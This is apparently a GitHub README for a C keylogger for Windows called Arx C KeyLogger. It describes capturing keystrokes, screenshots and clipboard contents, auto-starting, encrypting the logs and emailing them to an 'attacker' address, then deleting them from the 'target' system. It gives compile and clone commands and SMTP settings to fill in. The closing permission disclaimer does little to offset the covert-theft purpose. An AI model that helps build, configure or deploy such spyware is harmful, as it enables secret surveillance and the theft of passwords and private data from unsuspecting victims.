# Arx C KeyLogger

- This project is a keylogger application for the Windows operating system that logs keystrokes and sends the recorded data via email. 
- It also takes screenshots and logs clipboard data.

## Features

- Logs keyboard keystrokes
- Sends logs via email
- Takes screenshots
- Logs clipboard data
- Auto-starts the log file
- Splits the log file when it reaches a size limit
- Encrypts the log file
- Deletes the logged data from the target system after sending it to the attacker

## Requirements

- Windows operating system
- A C compiler (e.g., GCC)
- Required libraries: `user32.lib`, `wininet.lib`

## Installation

1. **Compile the Code**:
   Compile your code with a C compiler. For example:
   ```bash
   gcc -o keylogger keylogger.c -luser32 -lwininet


3. **Clone The Project:**
   ``
   git clone https://github.com/archescyber/arx-c-keylogger
   ``
4. **Configure SMTP Settings:**
 Fill in the following SMTP settings with your information:

```char attackerEmail[] = "your_attacker_email@gmail.com"; // Attacker's email address
char senderEmail[] = "your_email@gmail.com"; // Sender's Gmail address
char emailPassword[] = "your_email_password"; // Sender's Gmail password
```

4. Set the Path for Auto-Start: Change the following exePath value to the path of your application executable:

```
const char *exePath = "C:\\path\\to\\your\\executable.exe";
```
# Usage

1. Start the application.

2. The application will begin logging keystrokes and taking screenshots.


3. Logs will be sent via email at regular intervals (every 300 seconds).


4. The logged data will be deleted from the target system after being sent to the attacker.



# Notes

The misuse of this software is illegal. Please only use it on systems where you have permission and for ethical purposes.

To send emails via Gmail, you must enable the "Allow less secure apps" setting for your application.

## Contribution

Feel free to contribute to the project by submitting issues or pull requests. All contributions are welcome!

For communication, you can send feedback to my Instagram account named **@yusuf.cyw**
